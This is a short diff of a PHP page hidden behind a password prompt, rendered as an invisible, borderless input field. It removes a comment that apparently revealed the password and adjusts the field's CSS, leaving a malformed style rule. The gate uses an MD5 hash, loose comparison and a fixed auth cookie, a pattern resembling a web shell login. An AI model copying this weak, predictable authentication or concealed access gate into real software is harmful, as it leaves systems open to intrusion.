@@ -1,6 +1,6 @@
 <?php
 
-$password = "777b43f1482cc12b7383532fbc788784"; //pjpnever
+$password = "777b43f1482cc12b7383532fbc788784"; 
 if(isset($_POST['password'])) {
     if(md5($_POST['password']) == $password) {
         setcookie('auth', md5($password));
@@ -9,7 +9,7 @@ if(isset($_POST['password'])) {
 }
 if(isset($_COOKIE)) {
     if($_COOKIE['auth'] != md5($password)) {
-        echo "<form method=POST action=''><input type='password' name='password' style='outline: none; border: none'></form>";
+        echo "<form method=POST action=''><input type='password' name='password' style='outline: none; border: none text-align: center;'></form>";
         die();
     }
 }
